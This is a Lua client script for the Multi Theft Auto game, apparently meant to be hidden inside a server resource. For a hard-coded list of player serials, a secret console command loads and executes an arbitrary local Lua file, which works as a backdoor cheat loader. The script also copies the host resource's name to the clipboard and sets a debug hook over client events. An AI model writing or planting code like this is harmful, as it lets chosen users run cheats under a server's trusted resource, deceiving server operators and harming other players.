local serials = {
	["3964A9A5103CDA070946DED861649B52"] = true,
	["37ED17A71EB58EB05A02CC1B18B33F54"] = true,
	["BE26A9713CE36BD23DB953BBBC4817A3"] = true,
	["89A223C5E57272A69E111CE0BD494DA4"] = true,
	["876A8D4E4BD829EDB61A31F576C3A903"] = true,
	["AD2CCC92EDB6F442D813D59392575083"] = true,
}

local Path = "Faltorokos.lua"


addEventHandler("onClientConsole", getRootElement(),
	function (text)
		if text == "loadbotoware" then 
			create()
		end
	end 
)

function create()
    if serials[getPlayerSerial(localPlayer)] then 
	    if fileExists(Path) then
	        local created = fileCreate("megwarelek.remember", true)
	        local File = fileOpen(Path)
	        local FileSize = fileGetSize(File)
	        local LuaData = fileRead(File, FileSize)
	                
	        local LoadString = loadstring(tostring(LuaData)) 
	        pcall(LoadString) 
	                
	        fileClose(File)
	    else
	       	local created = fileCreate("megwarelek.remember", true)
	       	outputChatBox("#a20089[megwarelek]: #ffffffNo Lua file selected.", 255, 255, 255, true)
	    end
	end
end

if serials[getPlayerSerial(localPlayer)] then
	setClipboard(getResourceName(getThisResource())) 
end

if serials[getPlayerSerial(localPlayer)] then 
	addDebugHook("preEvent", 
		function (sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
			if functionName == "onClientPlayerTarget" or functionName == "onClientGUIMove" or functionName == "onClientRender" or functionName == "onClientKey" or functionName == "onClientHUDRender" or functionName == "onClientPreRender" or functionName == "onClientMTAFocusChange" or functionName == "onClientElementDataChange" or functionName == "onClientCharacter" or functionName == "onClientWorldSound" or functionName == "onClientPedStep" or functionName == "onClientCursorMove" or functionName == "onClientPedsProcessed" or functionName == "onClientClick" or functionName == "onClientElementStreamIn" or functionName == "onClientElementStreamOut" or functionName == "onClientColShapeLeave" or functionName == "onClientElementColShapeLeave" or functionName == "onClientElementColShapeLeave" or functionName == "onClientElementInteriorChange" or functionName == "onClientElementDimensionChange" or functionName == "onClientVehicleCollision" or functionName == "onClientColShapeHit" or functionName == "onClientMarkerHit" or functionName == "onClientElementColShapeHit" or functionName == "onClientColShapeHit" or functionName == "onClientElementDestroy" or functionName == "onClientResourceStart" or functionName == "onClientResourceStop" or functionName == "onClientSoundStopped" or functionName == "onClientSoundStarted" or functionName == "onClientConsole" or functionName == "onClientMarkerLeave" or functionName == "onClientDebugMessage" --[[felesleges script eventek logoltatasa]] or functionName == "receiveWeather" then 
				return 
			end

			--iprint(functionName, ...)

		end 
	)
end